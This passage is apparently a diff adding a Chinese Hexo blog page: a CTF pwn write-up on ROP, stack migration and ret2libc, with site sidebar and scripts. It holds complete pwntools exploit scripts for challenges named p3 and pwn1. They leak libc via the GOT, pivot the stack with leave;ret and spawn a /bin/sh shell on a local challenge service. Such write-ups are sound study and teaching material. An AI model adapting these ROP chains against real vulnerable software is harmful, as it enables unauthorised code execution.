class="line"></span><br><span class="line"><span class="comment">#rop1 = p32(plt_write)+p32(0x804847d)+p32(1)+p32(got_write)+p32(4)+p32(0x804847d)</span></span><br><span class="line"></span><br><span class="line">rop2=[</span><br><span class="line">	gets,</span><br><span class="line">	system,</span><br><span class="line">	buf1,</span><br><span class="line">	buf1,	</span><br><span class="line">]</span><br><span class="line">conn.recvuntil(<span class="string">":"</span>)</span><br><span class="line">conn.sendline(<span class="string">'a'</span>*<span class="number">20</span>+flat(rop2))</span><br><span class="line"></span><br><span class="line"><span class="comment">#发送rop1获取write的真实地址</span></span><br><span class="line"><span class="comment">#conn.sendline('a'*20+rop1)</span></span><br><span class="line"><span class="comment">#r =  conn.recvline()</span></span><br><span class="line"><span class="comment">#for i in range(1,len(r)):</span></span><br><span class="line"><span class="comment">#	print hex(u32(r[i:i+4]))</span></span><br><span class="line"><span class="comment">#print conn.recvline()</span></span><br><span class="line"><span class="comment">#print conn.recvline()</span></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line">conn.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure>
+<p><a href="https://blog.csdn.net/publicStr/article/details/80344321" target="_blank" rel="noopener">Pwn-最简单栈溢出（2018铁三云贵赛区）write函数泄露+用地址跳回重执行主函数</a></p>
+<p><a href="https://blog.csdn.net/qq_18661257/article/details/54694748" target="_blank" rel="noopener">GOT表和PLT表知识详解</a></p>
+<h2 id="ROP-三"><a href="#ROP-三" class="headerlink" title="ROP(三)"></a>ROP(三)</h2><p>Stack Migration</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Leave -&gt;mov esp,ebp, pop ebp</span><br></pre></td></tr></table></figure>
+<p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/PWN/ROP.assets/1534953910131.png" alt="1534953910131"></p>
+<p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/PWN/ROP.assets/1534953935732.png" alt="1534953935732"></p>
+<h3 id="p3"><a href="#p3" class="headerlink" title="p3"></a>p3</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">conn = remote(<span class="string">'127.0.0.1'</span>,<span class="string">'4000'</span>)</span><br><span class="line"></span><br><span class="line">p = ELF(<span class="string">'./p3'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib32/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">plt_puts = p.symbols[<span class="string">'puts'</span>]</span><br><span class="line">got_puts = p.got[<span class="string">'puts'</span>]</span><br><span class="line">puts_off = libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">gets = p.symbols[<span class="string">'gets'</span>]</span><br><span class="line"></span><br><span class="line">pop_ebp_ret = <span class="number">0x0804854b</span></span><br><span class="line">pop_s_d_b_ret = <span class="number">0x08048549</span></span><br><span class="line">leave_ret = <span class="number">0x08048408</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'gets:'</span>+hex(gets)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">buf = <span class="number">0x0804b000</span> <span class="number">-100</span></span><br><span class="line">buf1 = <span class="number">0x0804b000</span> <span class="number">-1000</span></span><br><span class="line"></span><br><span class="line">rop1 = [</span><br><span class="line">	plt_puts,</span><br><span class="line">	pop_ebp_ret,</span><br><span class="line">	got_puts,</span><br><span class="line">	gets,</span><br><span class="line">	pop_ebp_ret,</span><br><span class="line">	buf,</span><br><span class="line">	pop_ebp_ret,</span><br><span class="line">	buf<span class="number">-4</span>,</span><br><span class="line">	leave_ret,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">conn.sendline(<span class="string">'a'</span>*<span class="number">22</span>+flat(rop1))</span><br><span class="line"><span class="keyword">print</span> conn.recvline()</span><br><span class="line">r = u32(conn.recvline()[:<span class="number">4</span>])</span><br><span class="line"><span class="keyword">print</span> <span class="string">'puts_read:'</span>+ str(hex(r))</span><br><span class="line">libc_base =  r - puts_off</span><br><span class="line"><span class="keyword">print</span> <span class="string">'libc_base:'</span>+hex(libc_base)</span><br><span class="line"></span><br><span class="line">system_off = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">system = libc_base + system_off</span><br><span class="line"><span class="keyword">print</span> <span class="string">'system:'</span>+hex(system)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rop2=[</span><br><span class="line">	gets,</span><br><span class="line">	system,</span><br><span class="line">	buf1,</span><br><span class="line">	buf1,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">conn.sendline(flat(rop2))</span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line">raw_input(<span class="string">'#'</span>)</span><br><span class="line">conn.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -i s/alarm/isnan/g ./pwn1</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">conn = remote(<span class="string">'127.0.0.1'</span>,<span class="string">'4000'</span>)</span><br><span class="line"></span><br><span class="line">p = ELF(<span class="string">'./pwn1'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib32/libc.so.6'</span>)</span><br><span class="line">libc_start_main_got = p.got[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">libc_start_off = libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line"></span><br><span class="line">puts = p.symbols[<span class="string">'puts'</span>]</span><br><span class="line">read = p.symbols[<span class="string">'read'</span>]</span><br><span class="line"></span><br><span class="line">pop_ebp_ret = <span class="number">0x0804865f</span></span><br><span class="line">pop_s_d_b_ret = <span class="number">0x0804865d</span></span><br><span class="line">leave_ret = <span class="number">0x080484b8</span></span><br><span class="line">buf = <span class="number">0x804b000</span> - <span class="number">100</span></span><br><span class="line">buf1 = <span class="number">0x804b000</span> - <span class="number">500</span></span><br><span class="line"></span><br><span class="line">rop1=[</span><br><span class="line">	puts,</span><br><span class="line">	pop_ebp_ret,</span><br><span class="line">	libc_start_main_got,</span><br><span class="line">	read,</span><br><span class="line">	pop_s_d_b_ret,</span><br><span class="line">	<span class="number">0</span>,</span><br><span class="line">	buf,</span><br><span class="line">	<span class="number">50</span>,</span><br><span class="line">	pop_ebp_ret,</span><br><span class="line">	buf<span class="number">-4</span>,</span><br><span class="line">	leave_ret,	</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">conn.recvuntil(<span class="string">':'</span>)</span><br><span class="line">conn.sendline(<span class="string">'a'</span>*<span class="number">140</span>+flat(rop1))</span><br><span class="line">conn.recvline()</span><br><span class="line">conn.recvline()</span><br><span class="line">libc_base = <span class="number">0xf662e9e0</span> - libc_start_off</span><br><span class="line"></span><br><span class="line">gets_off = libc.symbols[<span class="string">'gets'</span>]</span><br><span class="line">system_off = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">gets = libc_base + gets_off</span><br><span class="line">system = libc_base + system_off</span><br><span class="line"></span><br><span class="line">rop2=[</span><br><span class="line">	gets,</span><br><span class="line">	system,</span><br><span class="line">	buf1,</span><br><span class="line">	buf1,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">conn.sendline(flat(rop2))</span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line">conn.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"><span class="comment">#raw_input('#')</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Pwn/" rel="tag"># Pwn</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/08/15/Protostart Stack Writeup/" rel="next" title="Protostart Stack Writeup">
+                <i class="fa fa-chevron-left"></i> Protostart Stack Writeup
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/avatar.jpg"
+                alt="Lhaihai" />
+            
+              <p class="site-author-name" itemprop="name">Lhaihai</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">55</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">23</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">28</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/TheReturnOfTheKing/" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Rop-一"><span class="nav-number">1.</span> <span class="nav-text">Rop(一)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#rop"><span class="nav-number">1.1.</span> <span class="nav-text">rop</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#simplerop"><span class="nav-number">1.2.</span> <span class="nav-text">simplerop</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ROP（二）"><span class="nav-number">2.</span> <span class="nav-text">ROP（二）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ret2libc"><span class="nav-number">2.1.</span> <span class="nav-text">ret2libc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pwnme"><span class="nav-number">2.2.</span> <span class="nav-text">pwnme</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ROP-三"><span class="nav-number">3.</span> <span class="nav-text">ROP(三)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#p3"><span class="nav-number">3.1.</span> <span class="nav-text">p3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pwn1"><span class="nav-number">3.2.</span> <span class="nav-text">pwn1</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-117483741-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-117483741-1');
+</script>
+
+<div class="copyright">&copy; 2018/3/11 &mdash; <span itemprop="copyrightYear">2018</span>
+
+		
+
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Lhaihai</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye">本站总访问量</i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      次
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
